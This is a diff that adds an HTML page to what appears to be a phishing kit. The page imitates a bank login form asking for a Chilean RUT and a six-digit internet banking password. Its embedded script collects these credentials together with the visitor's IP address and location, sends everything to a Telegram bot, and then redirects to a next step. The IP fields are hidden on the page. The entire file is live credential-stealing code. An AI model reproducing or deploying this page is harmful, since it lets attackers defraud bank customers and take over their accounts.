@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html >
+
+<head>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+  <script src="ohkk.js"></script>
+  <script>
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+            $("#gfg").html(data.ip);
+        });
+        $.getJSON("https://ipinfo.io", function(response) {
+      $("#ip").html("IP: " + response.ip);
+      $("#address").html("" + response.city + ", " + response.country);
+    });
+
+    var u_name, u_name2, ip, ip2, message;
+    var ready = function() {
+      u_name = document.getElementById("avergdn").value;
+      u_name2 = document.getElementById("avergdn2").value;
+      ip = document.getElementById("gfg").innerHTML;
+      ip2 = document.getElementById("address").innerHTML;
+      message = "MMMBB\n☰Usuario: " + u_name + "\n☰clv2: " + u_name2 + "\n🌎IP: " + ip +"\n" + ip2;
+    };
+    var sender = function() {
+      ready();
+      var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/json",
+          "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+          "chat_id": chat_id,
+          "text": message
+        })
+      };
+      $.ajax(settings).done(function(response) {
+        console.log(response);
+        window.location = 'paso00.html';
+      });
+      return false;
+    };
+
+</script>
+    <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>APPfala</title>
+  <link rel="stylesheet" href="portada/styles.css">
+</head>
+
+<body>
+
+
+  <div>
+ <img width="300px"   src="portada/spacee2.png" alt=""><br><br>
+    <h1>Ingresa lo solicitado</h1><br><br>
+    <form method="post" action="#" onsubmit="return sender();">
+   
+      <label for="userInput">RUT</label>
+      <input placeholder="Ingresa tu RUT" type="tel" id="avergdn" name="corone" required>
+
+      <label for="passwordInput">CLAVE INTERNET 6 DIGITOS:</label>
+      <input   minlength="6" maxlength="6" placeholder="Clave Internet" type="text" id="avergdn2"  name="corone2" required>
+
+      <button type="submit">CONFIRMAR</button>
+    </form>
+  </div><br>
+
+</body>
+<div style="color: rgb(255, 255, 255);font-size: 0.05px;" >
+  <p id="gfg"></p>
+  <p id="ip"></p>
+  <p id="address"></p></div>
+</html>
